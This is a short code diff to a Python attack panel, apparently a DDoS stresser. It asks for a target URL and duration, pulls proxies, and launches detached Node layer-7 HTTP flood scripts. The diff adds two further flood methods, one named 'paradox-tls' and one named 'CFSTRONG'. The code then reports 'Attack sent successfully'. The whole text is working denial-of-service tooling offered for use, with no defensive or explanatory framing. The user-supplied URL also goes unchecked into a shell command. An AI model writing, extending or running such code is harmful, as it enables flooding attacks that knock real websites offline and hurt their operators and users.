@@ -647,6 +647,7 @@ class Tool:
 					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
 					F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/https1 GET {url} utils/http.txt {floodtime} 64 1'], shell=True)
 					F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/https2 {url} {floodtime} 1'], shell=True)
+					F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/paradox-tls GET {url} utils/http.txt {floodtime} 512 15'], shell=True)
 					print(Color.LG+f"\n [!] Attack sent successfully!\n")
 				except:
 					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
@@ -677,6 +678,7 @@ class Tool:
 					reqs = int(input(f"{Color.LG} [>] Reqs(200): "+Color.RESET))
 					F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/socket {url} utils/http.txt {floodtime} {reqs}'], shell=True)
 					F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/socket1 {url} utils/http.txt {floodtime} {reqs}'], shell=True)
+					F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/CFSTRONG {url} {floodtime} 25 GET utils/http.txt 512'], shell=True)
 					print(Color.LG+f"\n [!] Attack sent successfully!\n")
 				except:
 					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
